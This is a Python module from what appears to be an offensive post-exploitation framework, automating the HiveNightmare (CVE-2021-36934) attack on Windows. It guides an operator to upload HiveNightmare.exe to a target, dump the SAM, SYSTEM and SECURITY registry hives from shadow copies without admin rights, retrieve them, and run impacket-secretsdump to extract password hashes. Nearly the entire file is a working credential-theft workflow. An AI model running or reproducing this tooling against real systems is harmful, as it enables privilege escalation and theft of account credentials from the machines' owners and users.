import shutil
import subprocess
from pathlib import Path

from core.paths import get_windows_tools_dir
from modules.upload.windows import stage_windows_files
from modules.download.windows import receive_windows_files


G, C, B, Y, W, R = (
        '\033[92m',
        '\033[96m',
        '\033[94m',
        '\033[93m',
        '\033[0m',
        '\033[91m',
)

DIM = '\033[2m'

HIVES = ("SAM", "SYSTEM", "SECURITY")


# ==========================================
# HELPERS
# ==========================================

def _header():

    print(f"\n{B}┌── MODULE: KERNEL EXPLOITS — HIVENIGHTMARE " + "─" * 16 + f"┐{W}")
    print(f"{B}│{W} TECHNIQUE: {C}{'CVE-2021-36934 / SeriousSam':<47}{W}{B}│{W}")
    print(f"{B}└" + "─" * 59 + f"┘{W}")


def _section(title):
    print(f"\n{B}[*] {title}{W}")


def _step(n, title, why=None):

    print(f"\n{B}[{n}]{W} {title}")

    if why:
        print(f"    {why}")


def _cmd(*lines):

    print()

    for line in lines:

        if line.startswith("#"):
            print(f"    {DIM}{line}{W}")
        elif "#" in line:
            code, comment = line.split("#", 1)
            print(f"    {Y}{code.rstrip()}{W}  {DIM}#{comment}{W}")
        else:
            print(f"    {Y}{line}{W}")


def _ask(prompt, default_yes=True, optional=False):

    #
    # Yellow [?] marks a genuinely skippable extra, not just any
    # default-to-no question — safety gates stay blue.
    #
    marker = Y if optional else B

    raw = input(f"\n{marker}[?]{W} {prompt}").strip().lower()

    if default_yes:
        return raw in ("", "y", "yes")

    return raw in ("y", "yes")


# ==========================================
# PUBLIC API
# ==========================================

def run(data, cred, args):

    _header()

    tool_path = get_windows_tools_dir() / "HiveNightmare.exe"

    if not tool_path.is_file():
        print(f"{Y}[!] {tool_path} doesn't exist — place it there before running this module, the transfer step below will fail otherwise.{W}")

    _section("Setup")

    _step(
        1,
        "Confirm SAM is readable by a low-privilege group",
        "If BUILTIN\\Users/Everyone don't show up here, this technique doesn't apply.",
    )
    _cmd(r"icacls C:\Windows\System32\config\SAM")

    if _ask("Transfer HiveNightmare.exe to the target? [Y/n]: "):
        stage_windows_files([tool_path])

    _section("Execute on target")

    _step(
        2,
        "Run HiveNightmare",
        "It tries every shadow copy automatically (up to 15 by default) and dumps whatever it can reach — no admin rights needed.",
    )
    _cmd(".\\HiveNightmare.exe")

    print()
    print(f"    {B}[*]{W} Note the date suffix it reports, e.g. \"SAM hive from 2021-08-07 written out ... as SAM-2021-08-07\".")

    suffix = ""

    while not suffix:
        suffix = input(f"\n{B}[?]{W} Date suffix HiveNightmare reported (e.g. 2021-08-07): ").strip()

    _section("Pull the hives back")

    receive_windows_files(
        [Path(f"{hive}-{suffix}") for hive in HIVES],
        archive_name=f"hives-{suffix}.zip"
    )

    _section("Extract hashes")

    secretsdump_bin = shutil.which("impacket-secretsdump") or shutil.which("secretsdump.py")

    _step(3, "Crack the hashes offline with secretsdump")
    _cmd(f"impacket-secretsdump -sam SAM-{suffix} -system SYSTEM-{suffix} -security SECURITY-{suffix} local")

    if secretsdump_bin:

        if _ask("Run this now against the downloaded hives? [Y/n]: "):

            subprocess.run([
                secretsdump_bin,
                "-sam", f"SAM-{suffix}",
                "-system", f"SYSTEM-{suffix}",
                "-security", f"SECURITY-{suffix}",
                "local",
            ])

    else:

        print(f"\n{Y}[!] impacket-secretsdump not found locally — install impacket, or run the command above manually.{W}")
